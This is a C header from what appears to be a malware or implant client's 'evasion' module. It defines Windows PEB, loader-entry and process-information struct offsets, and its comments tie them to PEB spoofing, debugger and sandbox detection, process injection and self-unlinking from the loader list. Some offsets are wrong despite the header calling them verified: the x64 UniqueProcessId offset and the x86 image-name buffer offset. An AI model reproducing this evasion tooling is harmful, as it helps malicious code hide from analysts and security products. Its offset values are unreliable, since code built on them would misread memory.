/*
 * client/evasion/nt_offsets.h  –  Single source of truth for NT struct offsets
 * ==============================================================================
 * All hard-coded field offsets that appear across spoof.c, sandbox.c,
 * evasion.c, inject.c, and sleep_obf.c are defined here as named constants.
 *
 * When a future Windows version changes any of these offsets, this is the
 * one file to update rather than doing a grep exercise across seven source files.
 *
 * Offset sources:
 *   • Verified against ntdll.pdb symbols on Windows 10 21H2 / 11 23H2 x64.
 *   • x86 offsets maintained in parallel where the field exists.
 *   • All offsets are byte offsets from the structure base.
 *
 * Usage:
 *   #include "nt_offsets.h"
 *   PVOID imgBase = *(PVOID *)((BYTE *)peb + PEB_ImageBaseAddress);
 */

#pragma once
#ifndef NT_OFFSETS_H
#define NT_OFFSETS_H

/* ── PEB field offsets ──────────────────────────────────────────────────── */

/*
 * PEB->ImageBaseAddress
 * The base address of the process image (set by the loader at process start).
 * Read by GetModuleHandleA(NULL) and by our own PE-walking code.
 * NOTE: spoof_peb() must NOT overwrite this field — see spoof.c for details.
 */
#ifdef _WIN64
#  define PEB_ImageBaseAddress        0x10
#else
#  define PEB_ImageBaseAddress        0x08
#endif

/*
 * PEB->OSBuildNumber
 * USHORT containing the Windows build number (e.g. 19041 for 2004, 22000 for 11).
 * Available Vista+.  Used in unlink_self_from_ldr() to decide whether to
 * unlink InInitializationOrderModuleList (pre-Win8 only).
 */
#ifdef _WIN64
#  define PEB_OSBuildNumber           0x120
#else
#  define PEB_OSBuildNumber           0xAC
#endif

/*
 * PEB->NtGlobalFlag
 * DWORD bitmask set by ntdll at process creation when a debugger is attached.
 * Bits of interest: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK |
 *                   FLG_HEAP_VALIDATE_PARAMETERS = 0x70.
 * Used in sandbox.c _check_debugger().
 */
#ifdef _WIN64
#  define PEB_NtGlobalFlag            0xBC
#else
#  define PEB_NtGlobalFlag            0x68
#endif


/* ── LDR_DATA_TABLE_ENTRY field offsets ─────────────────────────────────── */

/*
 * LDR_DATA_TABLE_ENTRY->HashLinks
 * LIST_ENTRY linking entries in ntdll's LdrpHashTable[].
 * Offset valid on x64 Windows Vista–11.
 */
#ifdef _WIN64
#  define LDR_ENTRY_HashLinks         0x70
#else
#  define LDR_ENTRY_HashLinks         0x3C
#endif


/* ── SYSTEM_PROCESS_INFORMATION field offsets ───────────────────────────── */

/*
 * SYSTEM_PROCESS_INFORMATION->ImageName.Length (USHORT)
 * Length of the image name UNICODE_STRING, in bytes (not including NUL).
 * At NtQuerySystemInformation(SystemProcessInformation=5) offset 0x38.
 */
#define SPI_ImageName_Length          0x38

/*
 * SYSTEM_PROCESS_INFORMATION->ImageName.Buffer (PVOID)
 * Pointer to the wide image name buffer.
 * At NtQuerySystemInformation(SystemProcessInformation=5) offset 0x40 (x64).
 */
#ifdef _WIN64
#  define SPI_ImageName_Buffer        0x40
#else
#  define SPI_ImageName_Buffer        0x24
#endif

/*
 * SYSTEM_PROCESS_INFORMATION->UniqueProcessId (HANDLE)
 * At offset 0x60 on x64.
 */
#ifdef _WIN64
#  define SPI_UniqueProcessId         0x60
#else
#  define SPI_UniqueProcessId         0x44
#endif

#endif /* NT_OFFSETS_H */
